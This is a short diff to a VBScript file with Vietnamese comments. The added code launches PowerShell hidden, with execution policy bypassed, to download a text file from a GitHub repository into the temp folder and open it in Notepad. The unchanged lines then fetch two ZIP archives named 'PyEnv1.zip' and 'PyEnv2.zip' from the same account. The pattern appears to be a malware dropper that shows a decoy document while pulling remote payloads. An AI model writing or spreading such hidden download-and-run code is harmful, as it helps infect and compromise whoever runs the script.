@@ -1,7 +1,29 @@
 Dim http, url1, url2, tempFolder, zip1, zip2
-Dim shell, fso, stream
+Dim shell, fso, stream, txtPath, scriptName
+
+
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Lấy đường dẫn và tên script hiện tại
+scriptPath = WScript.ScriptFullName
+scriptName = fso.GetBaseName(scriptPath)
+
+' Đường dẫn thư mục tạm và file txt cùng tên
+tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"
+txtPath = tempFolder & scriptName & ".txt"
+
+' Tải file txt từ GitHub
+rawUrl = "https://raw.githubusercontent.com/2UY5/2/refs/heads/main/noidungtxt"
+cmd1 = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+  """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')"""
+shell.Run cmd1, 0, True
+
+' Mở file txt sau khi tải
+shell.Run "notepad.exe """ & txtPath & """", 1, False
 
 ' URL của các file ZIP
+
 url1 = "https://github.com/2UY5/1/raw/refs/heads/main/PyEnv1.zip"
 url2 = "https://github.com/2UY5/1/raw/refs/heads/main/PyEnv2.zip"
 
